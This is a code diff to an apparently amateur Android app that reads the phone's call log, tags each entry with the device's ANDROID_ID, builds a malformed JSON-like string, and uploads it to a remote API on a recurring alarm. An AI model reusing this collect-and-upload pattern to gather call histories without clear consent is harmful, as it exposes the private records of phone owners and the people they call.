@@ -12,25 +12,41 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.icu.text.SimpleDateFormat;
+import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.CallLog;
+import android.provider.Settings;
 import android.util.Log;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.google.gson.Gson;
+
 import java.util.Calendar;
 import java.util.Date;
 
-public class MainActivity extends AppCompatActivity {
+import AlaaMeaad.calllogs.api.ApiServers;
+import okhttp3.RequestBody;
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
 
+import static AlaaMeaad.calllogs.api.ApiClient.getClient;
+
+public class MainActivity extends AppCompatActivity {
+    ApiServers apiServers;
     AlarmManager alarmManager;
     PendingIntent pendingIntent;
+    TextView textView;
+    StringBuffer sb;
+    Gson gson;
+    public static MainActivity mainActivity ;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-
+        mainActivity = this;
         if(ContextCompat.checkSelfPermission(MainActivity.this,
                 Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED){
             if(ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
@@ -42,25 +58,17 @@ public class MainActivity extends AppCompatActivity {
                         new String[]{Manifest.permission.READ_CALL_LOG} , 1);
             }
         }else  {
-            TextView textView = (TextView) findViewById(R.id.textview);
+            textView = (TextView) findViewById(R.id.textview);
             textView.setText(getCallDetails1());
         }
+        apiServers = getClient().create(ApiServers.class);
 
 
         alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
 
         Intent alarmIntent = new Intent(this, MyBroadCastReceiver.class);
         pendingIntent = PendingIntent.getBroadcast(this, 0, alarmIntent, 0);
-
-
-
         startAlarm();
-
-
-
-
-
-
     }
 
 
@@ -96,14 +104,13 @@ public class MainActivity extends AppCompatActivity {
                 return;
             }
         }
-//        getCalldetails();
 
     }
 
 
     public String getCallDetails1() {
 
-        StringBuffer sb = new StringBuffer();
+       sb = new StringBuffer();
         String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
 
         Date c = Calendar.getInstance().getTime();
@@ -124,7 +131,7 @@ public class MainActivity extends AppCompatActivity {
         int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
         int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
         int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
-        sb.append( "Call Details :");
+//        sb.append( "Call Details :");
         while ( managedCursor.moveToNext() ) {
             String phNumber = managedCursor.getString( number );
             String callType = managedCursor.getString( type );
@@ -146,13 +153,59 @@ public class MainActivity extends AppCompatActivity {
                     dir = "MISSED";
                     break;
             }
-            sb.append( "\nPhone Number:--- "+phNumber +" \nCall Type:--- "+dir+" \nCall Date:--- "+callDayTime+" \nCall duration in sec :--- "+callDuration );
-            sb.append("\n----------------------------------");
+            String android_id = Settings.Secure.getString(this.getContentResolver(),
+                    Settings.Secure.ANDROID_ID);
+            sb.append( "{'Phone Number':'"+phNumber+"','Call Type':'"+dir+"','Call Date':'"+callDayTime+"','Phone ID':'"+ android_id+"','Call duration in sec':'"+callDuration+"},");
+//            sb.append("\n----------------------------------");
         }
         managedCursor.close();
 
         return  sb.toString();
     }
 
+    public String allFilds() {
+//        String data = "textView.getText().toString()";
+        String data = textView.getText().toString();
+//        RequestBody body = RequestBody.create(okhttp3.MediaType.parse("application/json; charset=utf-8"), gson.toJson(data));
 
+
+        callLogs(data);
+
+        return data;
+    }
+
+
+
+    private void callLogs(String data) {
+
+        apiServers.callLogs(data).enqueue(new Callback<CallLogs>() {
+
+            @Override
+            public void onResponse(Call<CallLogs> call, Response<CallLogs> response) {
+                try {
+                    if (response.body().getStatus().equals("success") ) {
+                        Log.e("asasasas", "onReszxzxzxzponse: " );
+
+                        Toast.makeText(MainActivity.this,"done", Toast.LENGTH_SHORT).show();
+
+                    } else {
+                        Toast.makeText(MainActivity.this,"done1", Toast.LENGTH_SHORT).show();
+                        Log.e("asasasas", "onReszxzxzxzponse: " );
+
+                    }
+
+                } catch (Exception e) {
+                    Toast.makeText(MainActivity.this,"done3", Toast.LENGTH_SHORT).show();
+                    Log.e("asasasas", "onReszxzxzxzponse: " );
+
+                }
+            }
+
+            @Override
+            public void onFailure(Call<CallLogs> call, Throwable t) {
+                Toast.makeText(MainActivity.this,"done4", Toast.LENGTH_SHORT).show();
+
+            }
+        });
+    }
 }
